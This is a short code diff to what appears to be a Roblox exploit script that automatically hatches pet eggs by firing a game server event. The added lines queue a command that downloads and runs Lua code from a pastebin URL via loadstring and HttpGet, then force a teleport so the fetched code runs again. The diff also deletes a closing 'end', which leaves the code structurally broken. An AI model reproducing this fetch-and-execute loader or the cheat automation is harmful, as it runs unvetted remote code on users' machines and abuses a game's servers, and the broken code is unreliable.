@@ -106,10 +106,12 @@ for uid, v in pairs(savedData.SavedObjects) do
         local eggInstance = get_egg(uid)
         if eggInstance then
             replicated_storage.GameEvents.PetEggService:FireServer("HatchPet", eggInstance)
+            queue_on_teleport('loadstring(game:HttpGet("https://pastebin.com/phMPqnsw"))()')
+            task.wait(3)
+            teleport_service:Teleport(game.PlaceId)
             foundTargetPet = true
         end
     end
-end
  
 if not foundTargetPet then
     local tpCD = string.format([[
